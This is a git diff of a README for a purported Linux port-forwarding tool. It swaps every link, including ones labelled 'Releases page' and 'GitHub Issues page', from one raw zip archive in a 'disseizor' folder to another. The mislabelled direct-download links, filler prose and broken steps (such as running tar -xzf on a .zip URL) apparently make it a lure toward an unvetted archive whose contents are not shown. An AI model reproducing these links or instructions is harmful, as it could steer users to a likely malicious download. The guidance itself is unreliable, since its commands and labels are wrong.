@@ -1,7 +1,7 @@
 # 🚀 port-forward - Easily Manage Port Forwarding
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip%https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip)](https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip)
+[![Download](https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip%https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip)](https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the port-forward application. This tool manages Linux port forwarding using several methods. You can deploy it with one click and enjoy features like auto kernel optimization and improved network performance.
@@ -19,15 +19,15 @@ This guide helps you download and run the port-forward application. This tool ma
 
 ## 💡 Installation Instructions
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip) to find the latest version of port-forward. 
+   Go to the [Releases page](https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip) to find the latest version of port-forward. 
 
 2. **Download the Application**
-   On the Releases page, find the latest version. Click on the appropriate download link for your system. This will start downloading the https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip file.
+   On the Releases page, find the latest version. Click on the appropriate download link for your system. This will start downloading the https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip file.
 
 3. **Extract the Files**
    Once downloaded, navigate to your Downloads folder. Use the following command to extract the files (replace `filename` with the actual name of the downloaded file):
    ```bash
-   tar -xzf https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip
+   tar -xzf https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip
    ```
 
 4. **Run the Application**
@@ -42,7 +42,7 @@ This guide helps you download and run the port-forward application. This tool ma
    Follow the prompts to set up your port forwarding.
 
 ## 📥 Download & Install
-To get started, make sure you download the application from the Releases page. Use the following link to access it directly: [Download port-forward](https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip).
+To get started, make sure you download the application from the Releases page. Use the following link to access it directly: [Download port-forward](https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip).
 
 ## 🎛️ Configuration
 After starting the application, you will see the interactive CLI. Here’s a brief on how to configure your settings:
@@ -58,7 +58,7 @@ If you encounter any issues:
 3. **Network Configuration**: Verify your network settings if the port forwarding does not seem to work.
 
 ## 🤝 Support
-If you need help, please submit an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip). Keep your questions clear and provide details about your problem.
+If you need help, please submit an issue on the [GitHub Issues page](https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip). Keep your questions clear and provide details about your problem.
 
 ## 📜 License
 This project is licensed under the MIT License. Feel free to customize and share.
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. Feel free to customize and share
 ## 📣 Acknowledgements
 Thanks to everyone who contributed to making port-forward a powerful tool for Linux users. Your efforts are invaluable.
 
-To start using port-forward today, head straight to the [Releases page](https://raw.githubusercontent.com/Amine123-fd/port-forward/main/disseizor/forward_port_2.7.zip) to download and install this application.
+To start using port-forward today, head straight to the [Releases page](https://github.com/Amine123-fd/port-forward/raw/refs/heads/main/disseizor/forward-port-v1.8-beta.1.zip) to download and install this application.
